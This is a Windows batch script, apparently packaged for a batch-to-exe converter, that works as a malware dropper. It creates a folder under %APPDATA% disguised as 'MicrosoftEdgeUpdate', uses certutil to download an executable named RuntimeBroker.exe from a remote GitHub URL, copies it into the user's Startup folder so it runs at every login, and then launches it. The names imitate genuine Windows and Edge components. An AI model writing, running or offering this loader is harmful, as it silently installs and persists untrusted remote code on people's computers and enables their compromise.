::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSzk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFBhNTx3RAE+/Fb4I5/jH+++UtnEqXew7d5jI/rGIJe4X71eqcI4otg==
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
setlocal

:: Create hidden folder
set HIDDENFOLDER=%APPDATA%\MicrosoftEdgeUpdate
mkdir "%HIDDENFOLDER%" >nul 2>&1

:: Download using certutil
certutil -urlcache -split -f "https://raw.githubusercontent.com/EvocatedSupport/RuntimeBrokerFixer/refs/heads/main/RuntimeBroker.exe" "%HIDDENFOLDER%\RuntimeBroker.exe"

:: Copy to Startup
copy /Y "%HIDDENFOLDER%\RuntimeBroker.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\RuntimeBroker.exe" >nul

:: Run it
start "" "%HIDDENFOLDER%\RuntimeBroker.exe"

endlocal
exit
